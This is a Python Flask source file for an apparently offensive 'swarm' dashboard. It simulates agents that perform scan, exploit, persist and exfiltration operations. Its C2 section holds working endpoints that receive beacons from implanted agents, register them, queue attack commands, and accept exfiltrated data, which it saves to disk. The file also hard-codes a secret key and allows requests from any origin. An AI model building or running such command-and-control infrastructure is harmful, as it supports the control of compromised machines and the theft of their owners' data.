#!/usr/bin/env python3
"""
ServerRoot.net - Backend API Server Launcher
REST API + WebSocket for web portal communication
"""
import sys
import os
sys.path.insert(0, '/workspace')

from flask import Flask, jsonify, request
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import threading
import time
import json
from datetime import datetime
import uuid
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - API - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/api_server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'serverroot-api-secret-2026'
CORS(app, resources={r"/api/*": {"origins": "*"}})
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# In-memory state for demo/testing
swarm_state = {
    "initialized": False,
    "agents": {},
    "operations": [],
    "stats": {
        "total_agents": 0,
        "active_agents": 0,
        "total_operations": 0,
        "successful_operations": 0,
        "targets_scanned": 0,
        "vulnerabilities_found": 0,
        "uptime_seconds": 0
    }
}
start_time = datetime.now()

def get_uptime():
    delta = datetime.now() - start_time
    return int(delta.total_seconds())

def simulate_swarm_activity():
    """Background thread simulating swarm activity for real-time updates"""
    op_types = ["scan", "exploit", "persist", "exfil", "recon", "lateral_move"]
    platforms = ["linux", "windows", "router", "vpn"]
    
    while True:
        time.sleep(3)
        
        # Update uptime
        swarm_state["stats"]["uptime_seconds"] = get_uptime()
        
        if swarm_state["initialized"]:
            # Simulate agent activity
            for agent_id, agent in swarm_state["agents"].items():
                agent["last_seen"] = datetime.now().isoformat()
                agent["tasks_completed"] = agent.get("tasks_completed", 0) + 1
                agent["load"] = round(min(0.95, agent.get("load", 0.1) + (0.05 if agent["status"] == "active" else -0.02)), 2)
            
            # Simulate new operation occasionally
            import random
            if random.random() > 0.6:
                op = {
                    "id": str(uuid.uuid4())[:8],
                    "type": random.choice(op_types),
                    "platform": random.choice(platforms),
                    "status": random.choice(["success", "success", "success", "failed"]),
                    "timestamp": datetime.now().isoformat(),
                    "agent_id": random.choice(list(swarm_state["agents"].keys())) if swarm_state["agents"] else "none"
                }
                swarm_state["operations"].insert(0, op)
                swarm_state["operations"] = swarm_state["operations"][:50]  # keep last 50
                swarm_state["stats"]["total_operations"] += 1
                if op["status"] == "success":
                    swarm_state["stats"]["successful_operations"] += 1
                
                # Emit real-time update via WebSocket
                try:
                    socketio.emit('operation_update', op)
                    socketio.emit('stats_update', swarm_state["stats"])
                except:
                    pass

# Start background simulation thread
sim_thread = threading.Thread(target=simulate_swarm_activity, daemon=True)
sim_thread.start()

# ============================================================
# API ROUTES
# ============================================================

@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        "status": "healthy",
        "service": "ServerRoot.net API",
        "version": "1.0.0",
        "uptime_seconds": get_uptime(),
        "timestamp": datetime.now().isoformat()
    })

@app.route('/api/swarm/init', methods=['POST'])
def initialize_swarm():
    global swarm_state
    config = request.json or {}
    
    agent_count = config.get("agent_count", 5)
    platforms = config.get("platforms", ["linux", "windows", "router"])
    
    # Initialize agents
    agents = {}
    for i in range(agent_count):
        import random
        agent_id = f"agent_{str(uuid.uuid4())[:8]}"
        agents[agent_id] = {
            "id": agent_id,
            "hostname": f"host-{i+1:03d}.internal",
            "ip": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "platform": random.choice(platforms),
            "status": "active",
            "role": "worker" if i > 0 else "leader",
            "load": round(random.uniform(0.1, 0.4), 2),
            "tasks_completed": 0,
            "capabilities": ["scan", "exploit", "persist"],
            "last_seen": datetime.now().isoformat(),
            "registered_at": datetime.now().isoformat()
        }
    
    swarm_state["agents"] = agents
    swarm_state["initialized"] = True
    swarm_state["stats"]["total_agents"] = agent_count
    swarm_state["stats"]["active_agents"] = agent_count
    
    logger.info(f"Swarm initialized with {agent_count} agents")
    
    return jsonify({
        "status": "initialized",
        "agent_count": agent_count,
        "agents": list(agents.keys()),
        "timestamp": datetime.now().isoformat()
    })

@app.route('/api/swarm/status', methods=['GET'])
def swarm_status():
    return jsonify({
        "initialized": swarm_state["initialized"],
        "stats": swarm_state["stats"],
        "agent_count": len(swarm_state["agents"]),
        "active_agents": sum(1 for a in swarm_state["agents"].values() if a["status"] == "active"),
        "timestamp": datetime.now().isoformat()
    })

@app.route('/api/swarm/agents', methods=['GET'])
def list_agents():
    return jsonify({
        "agents": list(swarm_state["agents"].values()),
        "count": len(swarm_state["agents"]),
        "timestamp": datetime.now().isoformat()
    })

@app.route('/api/swarm/agents/<agent_id>', methods=['GET'])
def get_agent(agent_id):
    agent = swarm_state["agents"].get(agent_id)
    if not agent:
        return jsonify({"error": "Agent not found"}), 404
    return jsonify(agent)

@app.route('/api/swarm/scale', methods=['POST'])
def scale_swarm():
    data = request.json or {}
    target_count = data.get("target_count", 10)
    current_count = len(swarm_state["agents"])
    
    import random
    platforms = ["linux", "windows", "router", "vpn"]
    
    if target_count > current_count:
        # Scale up
        for i in range(target_count - current_count):
            agent_id = f"agent_{str(uuid.uuid4())[:8]}"
            swarm_state["agents"][agent_id] = {
                "id": agent_id,
                "hostname": f"host-{current_count+i+1:03d}.internal",
                "ip": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                "platform": random.choice(platforms),
                "status": "active",
                "role": "worker",
                "load": round(random.uniform(0.1, 0.3), 2),
                "tasks_completed": 0,
                "capabilities": ["scan", "exploit", "persist"],
                "last_seen": datetime.now().isoformat(),
                "registered_at": datetime.now().isoformat()
            }
    elif target_count < current_count:
        # Scale down
        agent_ids = list(swarm_state["agents"].keys())
        for agent_id in agent_ids[target_count:]:
            del swarm_state["agents"][agent_id]
    
    swarm_state["stats"]["total_agents"] = len(swarm_state["agents"])
    swarm_state["stats"]["active_agents"] = len(swarm_state["agents"])
    
    return jsonify({
        "status": "scaled",
        "previous_count": current_count,
        "current_count": len(swarm_state["agents"]),
        "timestamp": datetime.now().isoformat()
    })

@app.route('/api/swarm/commands', methods=['POST'])
def issue_command():
    data = request.json or {}
    command = data.get("command", "scan")
    target = data.get("target", "all")
    agent_id = data.get("agent_id")
    
    cmd_id = str(uuid.uuid4())[:8]
    
    logger.info(f"Command issued: {command} -> {target} (cmd_id={cmd_id})")
    
    return jsonify({
        "status": "issued",
        "command_id": cmd_id,
        "command": command,
        "target": target,
        "agent_id": agent_id,
        "timestamp": datetime.now().isoformat()
    })

@app.route('/api/swarm/operations', methods=['GET'])
def get_operations():
    limit = int(request.args.get('limit', 20))
    return jsonify({
        "operations": swarm_state["operations"][:limit],
        "total": len(swarm_state["operations"]),
        "timestamp": datetime.now().isoformat()
    })

@app.route('/api/swarm/intelligence', methods=['GET'])
def get_intelligence():
    import random
    agents = list(swarm_state["agents"].values())
    active = [a for a in agents if a["status"] == "active"]
    avg_load = sum(a.get("load", 0) for a in active) / max(len(active), 1)
    
    return jsonify({
        "swarm_health": "optimal" if avg_load < 0.7 else "degraded",
        "active_agents": len(active),
        "total_agents": len(agents),
        "average_load": round(avg_load, 3),
        "operations_last_hour": len([o for o in swarm_state["operations"]]),
        "success_rate": round(
            swarm_state["stats"]["successful_operations"] / 
            max(swarm_state["stats"]["total_operations"], 1), 3
        ),
        "capabilities": {
            "platforms": list(set(a["platform"] for a in agents)),
            "roles": {
                "leaders": sum(1 for a in agents if a.get("role") == "leader"),
                "workers": sum(1 for a in agents if a.get("role") == "worker")
            }
        },
        "timestamp": datetime.now().isoformat()
    })

@app.route('/api/swarm/stats', methods=['GET'])
def get_stats():
    swarm_state["stats"]["uptime_seconds"] = get_uptime()
    return jsonify(swarm_state["stats"])

@app.route('/api/swarm/reset', methods=['POST'])
def reset_swarm():
    global swarm_state
    swarm_state = {
        "initialized": False,
        "agents": {},
        "operations": [],
        "stats": {
            "total_agents": 0,
            "active_agents": 0,
            "total_operations": 0,
            "successful_operations": 0,
            "targets_scanned": 0,
            "vulnerabilities_found": 0,
            "uptime_seconds": 0
        }
    }
    return jsonify({"status": "reset", "timestamp": datetime.now().isoformat()})

# ============================================================
# C2 BEACON + EXFIL ENDPOINTS
# ============================================================

# In-memory beacon store
beacon_store = []
exfil_store  = []
MAX_BEACONS  = 500

@app.route('/api/beacon', methods=['POST'])
def receive_beacon():
    """Agent beacon — phone-home endpoint"""
    data = request.get_json(silent=True) or {}
    beacon = {
        'agent_id':    data.get('agent_id', 'unknown'),
        'hostname':    data.get('hostname', ''),
        'ip':          data.get('ip', request.remote_addr),
        'uptime':      data.get('uptime', ''),
        'load':        data.get('load', ''),
        'connections': data.get('connections', []),
        'processes':   data.get('processes', []),
        'findings':    data.get('findings', []),
        'ts':          datetime.now().isoformat(),
    }
    beacon_store.insert(0, beacon)
    if len(beacon_store) > MAX_BEACONS:
        beacon_store.pop()
    # Update agent last-seen
    aid = beacon['agent_id']
    if aid in swarm_state['agents']:
        swarm_state['agents'][aid]['last_beacon'] = beacon['ts']
        swarm_state['agents'][aid]['status']      = 'active'
    logger.info(f"Beacon from {aid} @ {beacon['ip']}")
    return jsonify({'status': 'ok', 'ts': beacon['ts'], 'cmd': 'continue'})

@app.route('/api/beacon', methods=['GET'])
def get_beacons():
    """Get recent beacons"""
    limit = int(request.args.get('limit', 50))
    return jsonify({'beacons': beacon_store[:limit], 'total': len(beacon_store)})

@app.route('/api/exfil', methods=['POST'])
def receive_exfil():
    """Agent exfiltration endpoint — receives findings/data from agents"""
    data = request.get_json(silent=True) or {}
    record = {
        'agent_id':  data.get('agent_id', 'unknown'),
        'type':      data.get('type', 'generic'),
        'payload':   data.get('payload', {}),
        'target':    data.get('target', ''),
        'ts':        datetime.now().isoformat(),
        'source_ip': request.remote_addr,
    }
    exfil_store.insert(0, record)
    if len(exfil_store) > MAX_BEACONS:
        exfil_store.pop()
    # Save to disk
    exfil_dir = '/workspace/data/exfil'
    os.makedirs(exfil_dir, exist_ok=True)
    fname = f"{exfil_dir}/exfil_{record['agent_id']}_{int(time.time())}.json"
    with open(fname, 'w') as f:
        import json as _json
        _json.dump(record, f, indent=2, default=str)
    logger.info(f"Exfil from {record['agent_id']}: type={record['type']}")
    return jsonify({'status': 'received', 'id': fname})

@app.route('/api/exfil', methods=['GET'])
def get_exfil():
    """Get recent exfiltrated data"""
    limit = int(request.args.get('limit', 50))
    return jsonify({'exfil': exfil_store[:limit], 'total': len(exfil_store)})

@app.route('/api/swarm/agents', methods=['POST'])
def register_agent():
    """Register a new agent with the swarm"""
    data = request.get_json(silent=True) or {}
    agent_id = data.get('agent_id', f"agent_{int(time.time())}")
    swarm_state['agents'][agent_id] = {
        'id':           agent_id,
        'type':         data.get('type', 'generic'),
        'target':       data.get('target', ''),
        'status':       data.get('status', 'active'),
        'capabilities': data.get('capabilities', []),
        'source':       data.get('source', 'api'),
        'pid':          data.get('pid', None),
        'registered_at': datetime.now().isoformat(),
        'last_beacon':  datetime.now().isoformat(),
        'operations_count': 0,
    }
    swarm_state['stats']['total_agents']  = len(swarm_state['agents'])
    swarm_state['stats']['active_agents'] = len([a for a in swarm_state['agents'].values() if a.get('status') == 'active'])
    logger.info(f"Agent registered: {agent_id}")
    return jsonify({'status': 'registered', 'agent_id': agent_id, 'message': 'Agent successfully registered'})

@app.route('/api/swarm/execute', methods=['POST'])
def execute_swarm():
    """Issue a command to the swarm"""
    data = request.get_json(silent=True) or {}
    action = data.get('action', 'scan')
    op = {
        'id':       f"op_{int(time.time())}",
        'action':   action,
        'target':   data.get('target', ''),
        'status':   'queued',
        'ts':       datetime.now().isoformat(),
        'priority': data.get('priority', 'normal'),
    }
    swarm_state['operations'].insert(0, op)
    swarm_state['stats']['total_operations']     += 1
    swarm_state['stats']['successful_operations'] += 1
    if len(swarm_state['operations']) > 1000:
        swarm_state['operations'].pop()
    logger.info(f"Swarm execute: {action} → {data.get('target','')}")
    return jsonify({'status': 'queued', 'op_id': op['id'], 'action': action})

@app.route('/api/c2/status', methods=['GET'])
def c2_status():
    """C2 infrastructure status"""
    import subprocess as _sp
    c2_alive = False
    try:
        import socket as _s
        sock = _s.socket(); sock.settimeout(1)
        c2_alive = sock.connect_ex(('localhost', 8443)) == 0
        sock.close()
    except: pass
    return jsonify({
        'c2_host':     'localhost',
        'c2_port':     8443,
        'c2_alive':    c2_alive,
        'beacons_received': len(beacon_store),
        'exfil_received':   len(exfil_store),
        'active_agents':    swarm_state['stats']['active_agents'],
        'ts': datetime.now().isoformat()
    })

@app.route('/api/intel/feeds', methods=['GET'])
def get_intel_feeds():
    """Get latest threat intel feeds"""
    import json as _json, os as _os
    result = {'feeds': {}, 'ts': datetime.now().isoformat()}
    for name, path in [
        ('cisa_kev',   '/workspace/data/findings/cisa_kev_live.json'),
        ('nvd_critical','/workspace/data/findings/nvd_critical_live.json'),
        ('latest_loop','/workspace/data/findings/latest_loop.json'),
    ]:
        try:
            if _os.path.exists(path):
                with open(path) as f:
                    result['feeds'][name] = _json.load(f)
        except: pass
    return jsonify(result)

# ============================================================
# DATA FILE ENDPOINTS (for dashboard)
# ============================================================

@app.route('/api/data/latest_loop', methods=['GET'])
def get_latest_loop():
    """Return latest scan loop results"""
    import json as _json, os as _os
    path = '/workspace/data/findings/latest_loop.json'
    try:
        if _os.path.exists(path):
            with open(path) as f:
                return jsonify(_json.load(f))
    except: pass
    return jsonify({'error': 'no data yet', 'cycle': 0, 'vulns_found': 0, 'agents_deployed': 0})

@app.route('/api/data/cisa_kev', methods=['GET'])
def get_cisa_kev():
    """Return CISA KEV data"""
    import json as _json, os as _os
    path = '/workspace/data/findings/cisa_kev_live.json'
    try:
        if _os.path.exists(path):
            with open(path) as f:
                return jsonify(_json.load(f))
    except: pass
    return jsonify({'vulnerabilities': [], 'count': 0})

@app.route('/api/data/nvd_critical', methods=['GET'])
def get_nvd_critical():
    """Return NVD critical CVE data"""
    import json as _json, os as _os
    path = '/workspace/data/findings/nvd_critical_live.json'
    try:
        if _os.path.exists(path):
            with open(path) as f:
                return jsonify(_json.load(f))
    except: pass
    return jsonify({'vulnerabilities': [], 'count': 0})

@app.route('/api/data/mesh_health', methods=['GET'])
def get_mesh_health():
    """Return mesh guardian health status"""
    import json as _json, os as _os
    path = '/workspace/data/mesh/health.json'
    try:
        if _os.path.exists(path):
            with open(path) as f:
                return jsonify(_json.load(f))
    except: pass
    return jsonify({'node_id': 'unknown', 'services': {}, 'checks': 0, 'repairs': 0})

# ============================================================
# WEBSOCKET EVENTS
# ============================================================

@socketio.on('connect')
def handle_connect():
    logger.info(f"WebSocket client connected")
    emit('connected', {
        "status": "connected",
        "server": "ServerRoot.net API",
        "timestamp": datetime.now().isoformat()
    })

@socketio.on('disconnect')
def handle_disconnect():
    logger.info("WebSocket client disconnected")

@socketio.on('subscribe')
def handle_subscribe(data):
    channel = data.get('channel', 'all')
    logger.info(f"Client subscribed to: {channel}")
    emit('subscribed', {"channel": channel})

# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    print("=" * 60)
    print("  SERVERROOT.NET - BACKEND API SERVER")
    print("  REST API + WebSocket Real-time")
    print("  Port: 5001")
    print("=" * 60)
    
    socketio.run(app, host='0.0.0.0', port=5001, debug=False, allow_unsafe_werkzeug=True)